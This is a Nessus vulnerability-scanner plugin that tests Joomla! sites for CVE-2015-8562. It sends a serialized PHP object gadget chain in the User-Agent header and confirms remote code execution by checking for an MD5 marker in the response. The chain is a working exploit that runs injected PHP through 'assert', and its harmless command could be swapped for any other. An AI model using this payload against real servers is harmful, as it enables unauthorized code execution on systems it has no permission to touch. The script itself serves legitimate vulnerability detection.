#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(88489);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2015-8562");
  script_bugtraq_id(79195);
  script_osvdb_id(131679);
  script_xref(name:"EDB-ID", value:"38977");
  script_xref(name:"EDB-ID", value:"39033");

  script_name(english:"Joomla! User-Agent Object Injection RCE");
  script_summary(english:"Attempts to execute PHP code by header object injection.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Joomla! application running on the remote web server is affected
by a remote code execution vulnerability due to improper sanitization
of the User-Agent header field when saving session values. An
unauthenticated, remote attacker can exploit this, via a serialized
PHP object, to execute arbitrary PHP code.");
  # https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bec8944e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 3.4.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Joomla HTTP Header Unauthenticated Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/12/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/12/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/01/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("global_settings.inc");
include("audit.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

function gen_php_object_payload(str)
{
  local_var objectPayload, injectedCommand, injectionTemplate;

  injectedCommand = "die(md5('"+str+"'));";
  injectionTemplate = injectedCommand+';JFactory::getConfig();exit;';

  objectPayload = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}';
  objectPayload += 's:8:"feed_url";s:'+strlen(injectionTemplate)+':"'+injectionTemplate+'";';
  objectPayload += 's:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}';
  objectPayload += '\xf0\x9d\x8c\x86';

  return objectPayload;
}

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

hashString = "NESSUS" + rand_str(charset:"0123456789", length:5);
hashVal = MD5(hashString);
objectInjectionPayload = gen_php_object_payload(str: hashString);

# Send object injection payload in User-Agent.
clear_cookiejar();
r = http_send_recv3(method: "GET",
  item: dir + "/index.php",
  port:port,
  add_headers: make_array("User-Agent", objectInjectionPayload),
  exit_on_fail : TRUE
);
req1 = http_last_sent_request();

headers = parse_http_headers(status_line:r[0], headers:r[1]);
if (isnull(headers)) audit(AUDIT_WEB_NO_SERVER_HEADER, port);

cookie = headers['set-cookie'];
if (isnull(cookie)) exit(1, "Did not receive a session cookie in the first request to the " +app+ " install at " + install_url);

# Check for executed payload in next request
r = http_send_recv3(
  method : "GET",
  item   : dir + "/index.php",
  port   : port,
  add_headers  : make_array("Cookies", cookie),
  exit_on_fail : TRUE
);

# The hash value was not in the response, so the exploit did not work
if(hexstr(hashVal) >!< r[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

output = strstr(r[2], hexstr(hashVal));
if (empty_or_null(output)) output = r[2];

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  generic     : TRUE,
  request     : make_list(req1, http_last_sent_request()),
  output      : chomp(output)
);
exit(0);
